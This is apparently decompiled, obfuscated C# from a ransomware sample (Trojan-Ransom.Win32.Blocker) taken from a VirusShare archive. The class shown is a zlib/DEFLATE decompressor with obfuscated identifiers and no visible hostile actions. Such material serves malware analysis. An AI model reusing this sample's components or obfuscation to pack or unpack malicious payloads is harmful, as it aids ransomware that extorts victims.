// Decompiled with JetBrains decompiler
// Type: ?1?.?51?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using \u003F15\u003F;
using System;
using System.Runtime.CompilerServices;

namespace \u003F1\u003F
{
  internal class \u003F51\u003F
  {
    private const int \u003F1\u003F = 0;
    private const int \u003F15\u003F = 1;
    private const int \u003F16\u003F = 2;
    private const int \u003F17\u003F = 3;
    private const int \u003F18\u003F = 4;
    private const int \u003F19\u003F = 5;
    private const int \u003F20\u003F = 6;
    private const int \u003F21\u003F = 7;
    private const int \u003F22\u003F = 8;
    private const int \u003F23\u003F = 9;
    private const int \u002E = 10;
    private const int \u003F25\u003F = 11;
    private const int \u003F26\u003F = 12;
    private static int[] \u003F1\u003F = new int[29]
    {
      3,
      4,
      5,
      6,
      7,
      8,
      9,
      10,
      11,
      13,
      15,
      17,
      19,
      23,
      27,
      31,
      35,
      43,
      51,
      59,
      67,
      83,
      99,
      115,
      131,
      163,
      195,
      227,
      258
    };
    private static int[] \u003F15\u003F = new int[29]
    {
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      1,
      1,
      1,
      2,
      2,
      2,
      2,
      3,
      3,
      3,
      3,
      4,
      4,
      4,
      4,
      5,
      5,
      5,
      5,
      0
    };
    private static int[] \u003F16\u003F = new int[30]
    {
      1,
      2,
      3,
      4,
      5,
      7,
      9,
      13,
      17,
      25,
      33,
      49,
      65,
      97,
      129,
      193,
      257,
      385,
      513,
      769,
      1025,
      1537,
      2049,
      3073,
      4097,
      6145,
      8193,
      12289,
      16385,
      24577
    };
    private static int[] \u003F17\u003F = new int[30]
    {
      0,
      0,
      0,
      0,
      1,
      1,
      2,
      2,
      3,
      3,
      4,
      4,
      5,
      5,
      6,
      6,
      7,
      7,
      8,
      8,
      9,
      9,
      10,
      10,
      11,
      11,
      12,
      12,
      13,
      13
    };
    private int \u003F27\u003F;
    private int \u003F29\u003F;
    private int \u003F28\u003F;
    private int \u003F24\u003F;
    private int \u003F38\u003F;
    private int \u003F46\u003F;
    private bool \u003F1\u003F;
    private int \u003F34\u003F;
    private int \u003F13\u003F;
    private bool \u003F15\u003F;
    private \u003F48\u003F \u003F1\u003F;
    private \u003F47\u003F \u003F1\u003F;
    private \u003F30\u003F \u003F1\u003F;
    private \u003F31\u003F \u003F1\u003F;
    private \u003F31\u003F \u003F15\u003F;
    private \u003F13\u003F \u003F1\u003F;

    public \u003F51\u003F()
      : this(false)
    {
    }

    public \u003F51\u003F(bool _param1)
    {
      this.\u003F15\u003F = _param1;
      this.\u003F1\u003F = new \u003F13\u003F();
      this.\u003F1\u003F = new \u003F48\u003F();
      this.\u003F1\u003F = new \u003F47\u003F();
      this.\u003F27\u003F = _param1 ? 2 : 0;
    }

    public void \u003F1\u003F()
    {
      this.\u003F27\u003F = this.\u003F15\u003F ? 2 : 0;
      this.\u003F13\u003F = this.\u003F34\u003F = 0;
      this.\u003F1\u003F.\u003F18\u003F();
      this.\u003F1\u003F.\u003F16\u003F();
      this.\u003F1\u003F = (\u003F30\u003F) null;
      this.\u003F1\u003F = (\u003F31\u003F) null;
      this.\u003F15\u003F = (\u003F31\u003F) null;
      this.\u003F1\u003F = false;
      this.\u003F1\u003F.\u0001();
    }

    private bool \u003F15\u003F()
    {
      int num1 = this.\u003F1\u003F.\u003F1\u003F(16);
      if (num1 < 0)
        return false;
      this.\u003F1\u003F.\u003F15\u003F(16);
      int num2 = (num1 << 8 | num1 >> 8) & (int) ushort.MaxValue;
      if (num2 % 31 != 0)
        throw new FormatException(\u003F19\u003F.\u003F1\u003F(1518300028, 748122970, 1872558849));
      if ((num2 & 3840) != \u003F14\u003F.\u003F18\u003F << 8)
        throw new FormatException(\u003F19\u003F.\u003F1\u003F(1252533251, 748122990, 1872558875));
      if ((num2 & 32) != 0)
      {
        this.\u003F27\u003F = 1;
        this.\u003F28\u003F = 32;
      }
      else
        goto label_9;
label_5:
      return true;
label_9:
      this.\u003F27\u003F = 2;
      goto label_5;
    }

    private bool \u003F16\u003F()
    {
      for (; this.\u003F28\u003F > 0; this.\u003F28\u003F -= 8)
      {
        int num = this.\u003F1\u003F.\u003F1\u003F(8);
        if (num < 0)
          return false;
        this.\u003F1\u003F.\u003F15\u003F(8);
        this.\u003F29\u003F = this.\u003F29\u003F << 8 | num;
      }
      return false;
    }

    private bool \u003F17\u003F()
    {
      int num1 = this.\u003F1\u003F.\u003F1\u003F();
      while (num1 >= 258)
      {
        switch (this.\u003F27\u003F)
        {
          case 7:
            int num2;
            while (((num2 = this.\u003F1\u003F.\u003F1\u003F(this.\u003F1\u003F)) & -256) == 0)
            {
              this.\u003F1\u003F.\u003F1\u003F(num2);
              if (--num1 < 258)
                return true;
            }
            if (num2 < 257)
            {
              if (num2 < 0)
                return false;
              this.\u003F15\u003F = (\u003F31\u003F) null;
              this.\u003F1\u003F = (\u003F31\u003F) null;
              this.\u003F27\u003F = 2;
              return true;
            }
            try
            {
              this.\u003F24\u003F = \u003F51\u003F.\u003F1\u003F[num2 - 257];
              this.\u003F28\u003F = \u003F51\u003F.\u003F15\u003F[num2 - 257];
              goto case 8;
            }
            catch (Exception ex)
            {
              throw new FormatException(\u003F19\u003F.\u003F1\u003F(681085144, 748123106, 1872558849));
            }
          case 8:
            if (this.\u003F28\u003F > 0)
            {
              this.\u003F27\u003F = 8;
              int num3 = this.\u003F1\u003F.\u003F1\u003F(this.\u003F28\u003F);
              if (num3 < 0)
                return false;
              this.\u003F1\u003F.\u003F15\u003F(this.\u003F28\u003F);
              this.\u003F24\u003F += num3;
            }
            this.\u003F27\u003F = 9;
            goto case 9;
          case 9:
            int index = this.\u003F15\u003F.\u003F1\u003F(this.\u003F1\u003F);
            if (index < 0)
              return false;
            try
            {
              this.\u003F38\u003F = \u003F51\u003F.\u003F16\u003F[index];
              this.\u003F28\u003F = \u003F51\u003F.\u003F17\u003F[index];
              goto case 10;
            }
            catch (Exception ex)
            {
              throw new FormatException(\u003F19\u003F.\u003F1\u003F(922191184, 748122892, 1872558853));
            }
          case 10:
            if (this.\u003F28\u003F > 0)
            {
              this.\u003F27\u003F = 10;
              int num4 = this.\u003F1\u003F.\u003F1\u003F(this.\u003F28\u003F);
              if (num4 < 0)
                return false;
              this.\u003F1\u003F.\u003F15\u003F(this.\u003F28\u003F);
              this.\u003F38\u003F += num4;
            }
            this.\u003F1\u003F.\u003F1\u003F(this.\u003F24\u003F, this.\u003F38\u003F);
            num1 -= this.\u003F24\u003F;
            this.\u003F27\u003F = 7;
            continue;
          default:
            throw new FormatException();
        }
      }
      return true;
    }

    private bool \u003F18\u003F()
    {
      for (; this.\u003F28\u003F > 0; this.\u003F28\u003F -= 8)
      {
        int num = this.\u003F1\u003F.\u003F1\u003F(8);
        if (num < 0)
          return false;
        this.\u003F1\u003F.\u003F15\u003F(8);
        this.\u003F29\u003F = this.\u003F29\u003F << 8 | num;
      }
      if ((int) this.\u003F1\u003F.\u0020() == this.\u003F29\u003F)
      {
        this.\u003F27\u003F = 12;
        return false;
      }
      throw new FormatException(\u003F19\u003F.\u003F1\u003F(679965753, 748123050, 1872558871) + (object) (int) this.\u003F1\u003F.\u0020() + \u003F19\u003F.\u003F1\u003F(1478651450, 748123092, 1872558885) + (object) this.\u003F29\u003F);
    }

    private bool \u003F19\u003F()
    {
      switch (this.\u003F27\u003F)
      {
        case 0:
          return this.\u003F15\u003F();
        case 1:
          return this.\u003F16\u003F();
        case 2:
          if (!this.\u003F1\u003F)
          {
            int num = this.\u003F1\u003F.\u003F1\u003F(3);
            if (num < 0)
              return false;
            this.\u003F1\u003F.\u003F15\u003F(3);
            if ((num & 1) != 0)
              goto label_29;
label_8:
            switch (num >> 1)
            {
              case 0:
                this.\u003F1\u003F.\u003F16\u003F();
                this.\u003F27\u003F = 3;
                break;
              case 1:
                this.\u003F1\u003F = \u003F31\u003F.\u003F1\u003F;
                this.\u003F15\u003F = \u003F31\u003F.\u003F15\u003F;
                this.\u003F27\u003F = 7;
                break;
              case 2:
                this.\u003F1\u003F = new \u003F30\u003F();
                this.\u003F27\u003F = 6;
                break;
              default:
                throw new FormatException(\u003F19\u003F.\u003F1\u003F(65347630, 748122688, 1872558857) + (object) num);
            }
            return true;
label_29:
            this.\u003F1\u003F = true;
            goto label_8;
          }
          else
          {
            if (!this.\u003F15\u003F)
            {
              this.\u003F1\u003F.\u003F16\u003F();
              this.\u003F28\u003F = 32;
              this.\u003F27\u003F = 11;
              return true;
            }
            this.\u003F27\u003F = 12;
            return false;
          }
        case 3:
          if ((this.\u003F46\u003F = this.\u003F1\u003F.\u003F1\u003F(16)) < 0)
            return false;
          this.\u003F1\u003F.\u003F15\u003F(16);
          this.\u003F27\u003F = 4;
          goto case 4;
        case 4:
          int num1 = this.\u003F1\u003F.\u003F1\u003F(16);
          if (num1 < 0)
            return false;
          this.\u003F1\u003F.\u003F15\u003F(16);
          if (num1 != (this.\u003F46\u003F ^ (int) ushort.MaxValue))
            throw new FormatException(\u003F19\u003F.\u003F1\u003F(2070308883, 748123026, 1872558877));
          this.\u003F27\u003F = 5;
          goto case 5;
        case 5:
          this.\u003F46\u003F -= this.\u003F1\u003F.\u003F1\u003F(this.\u003F1\u003F, this.\u003F46\u003F);
          if (this.\u003F46\u003F != 0)
            return !this.\u003F1\u003F.\u0003();
          this.\u003F27\u003F = 2;
          return true;
        case 6:
          if (!this.\u003F1\u003F.\u003F1\u003F(this.\u003F1\u003F))
            return false;
          this.\u003F1\u003F = this.\u003F1\u003F.\u003F1\u003F();
          this.\u003F15\u003F = this.\u003F1\u003F.\u003F15\u003F();
          this.\u003F27\u003F = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return this.\u003F17\u003F();
        case 11:
          return this.\u003F18\u003F();
        case 12:
          return false;
        default:
          throw new FormatException();
      }
    }

    public void \u003F1\u003F(byte[] _param1) => this.\u003F1\u003F(_param1, 0, _param1.Length);

    public void \u003F1\u003F(byte[] _param1, int _param2, int _param3)
    {
      if (!this.\u0007())
        throw new InvalidOperationException();
      this.\u003F1\u003F.\u0020(_param1, _param2, _param3);
      if ((int) this.\u003F1\u003F.\u0020() != this.\u003F29\u003F)
        throw new ArgumentException(\u003F19\u003F.\u003F1\u003F(2000614785, 748122682, 1872558855));
      this.\u003F1\u003F.\u0001();
      this.\u003F1\u003F.\u003F1\u003F(_param1, _param2, _param3);
      this.\u003F27\u003F = 2;
    }

    public void \u003F15\u003F(byte[] _param1) => this.\u003F15\u003F(_param1, 0, _param1.Length);

    public void \u003F15\u003F(byte[] _param1, int _param2, int _param3)
    {
      this.\u003F1\u003F.\u003F15\u003F(_param1, _param2, _param3);
      this.\u003F13\u003F += _param3;
    }

    public int \u003F16\u003F(byte[] _param1) => this.\u003F16\u003F(_param1, 0, _param1.Length);

    public int \u003F16\u003F(byte[] _param1, int _param2, int _param3)
    {
      if (_param3 < 0)
        throw new ArgumentOutOfRangeException(\u003F19\u003F.\u003F1\u003F(1049074681, 748122642, 1872558881));
      if (_param3 == 0)
        return 0;
      int num1 = 0;
      do
      {
        if (this.\u003F27\u003F != 11)
          goto label_8;
label_4:
        continue;
label_8:
        int num2 = this.\u003F1\u003F.\u003F15\u003F(_param1, _param2, _param3);
        this.\u003F1\u003F.\u0020(_param1, _param2, num2);
        _param2 += num2;
        num1 += num2;
        this.\u003F34\u003F += num2;
        _param3 -= num2;
        if (_param3 != 0)
          goto label_4;
        else
          goto label_9;
      }
      while (this.\u003F19\u003F() || this.\u003F1\u003F.\u003F15\u003F() > 0 && this.\u003F27\u003F != 11);
      return num1;
label_9:
      return num1;
    }

    [SpecialName]
    public bool \u0006() => this.\u003F1\u003F.\u0003();

    [SpecialName]
    public bool \u0007() => this.\u003F27\u003F == 1 && this.\u003F28\u003F == 0;

    [SpecialName]
    public bool \u0008() => this.\u003F27\u003F == 12 && this.\u003F1\u003F.\u003F15\u003F() == 0;

    [SpecialName]
    public int \u0009() => this.\u0007() ? this.\u003F29\u003F : (int) this.\u003F1\u003F.\u0020();

    [SpecialName]
    public int \u002E() => this.\u003F34\u003F;

    [SpecialName]
    public int \u0028() => this.\u003F13\u003F - this.\u0029();

    [SpecialName]
    public int \u0029() => this.\u003F1\u003F.\u0001();
  }
}
